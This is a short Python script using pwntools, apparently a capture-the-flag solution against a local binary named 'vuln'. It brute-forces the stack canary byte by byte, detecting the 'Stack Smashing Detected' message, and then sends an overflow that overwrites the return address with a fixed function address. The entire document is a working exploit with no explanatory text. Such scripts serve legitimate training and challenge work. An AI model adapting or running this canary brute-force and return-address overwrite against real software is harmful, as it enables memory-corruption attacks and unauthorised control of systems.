#!/usr/bin/env python

from pwn import *

payload = "A" * 32
canary = ""

i = 0
while i < 256 and len(canary) < 4:
    r = process("./vuln")
    r.recvuntil("> ")
    
    r.sendline("120")
    r.recvuntil("> ")
    
    r.send(payload + canary + chr(i))
    data = r.recvall()
    if "*** Stack Smashing Detected ***" not in data:
        canary += chr(i)
        i = 0
        continue

    i += 1
    r.close()

r = process("./vuln")
r.recvuntil("> ")
r.sendline("120")

r.recvuntil("> ")
payload = (
    "A" * 32 +
    canary +
    "A" * 16 +
    p32(0x80486eb)
)
r.sendline(payload)
print(r.recvall())

r.close()
